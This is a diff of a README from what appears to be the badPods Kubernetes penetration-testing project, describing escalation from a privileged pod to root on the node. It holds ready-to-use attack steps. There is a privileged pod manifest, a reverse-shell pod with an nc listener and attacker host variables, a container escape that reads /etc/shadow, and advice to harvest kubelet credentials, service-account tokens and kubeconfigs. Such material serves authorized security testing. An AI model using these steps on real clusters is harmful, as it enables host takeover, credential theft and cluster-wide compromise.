@@ -1,6 +1,8 @@
 ## You can create a pod with only privileged: true
 
-If you only have `privileged=true`, you can eventually get an interactive shell on the node, but you start with non-interactive command execution as root and you'll have to upgrade it if you want interactive access. The privesc paths are the same as above.
+If you only have `privileged=true`, you can eventually get an interactive shell on the node, but you start with non-interactive command execution as root and you'll have to upgrade it if you want interactive access. 
+
+One promising privesc path is available if you can schedule your pod to run on the control plane node using the nodeName selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  
 
 # Pod Creation
 
@@ -9,12 +11,12 @@ If you only have `privileged=true`, you can eventually get an interactive shell 
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-priv-only
+  name: pod-priv
   labels: 
     app: pentest
 spec:
   containers:
-  - name: priv-only
+  - name: priv
     image: ubuntu
     command: [ "/bin/bash", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
@@ -23,21 +25,21 @@ spec:
   # Force scheduling of your pod on a control plane node by uncommenting the next line and changing the nodeName to that of a control plane node
   #nodeName: k8s-control-plane-node
   ```
-[pod-priv-only.yaml](pod-priv-only.yaml)
+[pod-priv.yaml](pod-priv.yaml)
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-priv-only.yaml   
+kubectl apply -f pod-priv.yaml   
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/priv-only/pod-priv-only.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/priv/pod-priv.yaml  
 ```
 
 ### Exec into pod 
 ```bash
-kubectl -n [namespace] exec -it pod-priv-only -- bash
+kubectl -n [namespace] exec -it pod-priv -- bash
 ```
 
 ## Or, create a reverse shell pod
@@ -61,7 +63,7 @@ spec:
   #nodeName: k8s-control-plane-node
   restartPolicy: Always
 ```
-[pod-priv-only-revshell.yaml](pod-priv-only-revshell.yaml)
+[pod-priv-revshell.yaml](pod-priv-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -72,7 +74,7 @@ nc -nvlp 3116
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
 HOST="10.0.0.1" PORT="3116" 
-envsubst < ./yaml/priv-only/pod-priv-only-revshell.yaml | kubectl apply -f -
+envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
@@ -81,10 +83,6 @@ envsubst < ./yaml/priv-only/pod-priv-only-revshell.yaml | kubectl apply -f -
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
-
-
-
-
 
 # Post exploitation
 
@@ -100,8 +98,6 @@ Reference(s):
 ```bash
 sh undock.sh "cat /etc/shadow"
 ```
-
-
 
 #### Look for kubeconfig's in the host filesystem 
 If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
